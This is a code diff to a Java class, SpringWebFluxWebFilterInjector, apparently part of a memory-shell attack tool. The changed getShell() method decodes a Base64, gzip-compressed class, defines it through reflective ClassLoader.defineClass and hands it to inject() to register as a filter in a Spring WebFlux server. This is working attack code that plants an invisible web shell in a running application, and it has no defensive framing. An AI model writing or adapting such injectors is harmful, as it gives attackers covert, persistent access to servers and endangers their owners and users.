@@ -32,7 +32,7 @@ public class SpringWebFluxWebFilterInjector {
     public SpringWebFluxWebFilterInjector() {
         try {
             FilteringWebHandler webHandler = getWebHandler();
-            Object filter = getShell();
+            Object filter = getShell(webHandler);
             inject(webHandler, filter);
         } catch (Exception e) {
             e.printStackTrace();
@@ -52,19 +52,18 @@ public class SpringWebFluxWebFilterInjector {
         return null;
     }
 
-    private Object getShell() throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        Object interceptor = null;
+    @SuppressWarnings("all")
+    private Object getShell(Object context) throws Exception {
+        ClassLoader classLoader = context.getClass().getClassLoader();
         try {
-            interceptor = classLoader.loadClass(getClassName()).newInstance();
+            return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(Base64Utils.decodeFromString(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-            interceptor = clazz.newInstance();
+            return clazz.newInstance();
         }
-        return interceptor;
     }
 
     public void inject(FilteringWebHandler webHandler, Object filter) throws Exception {
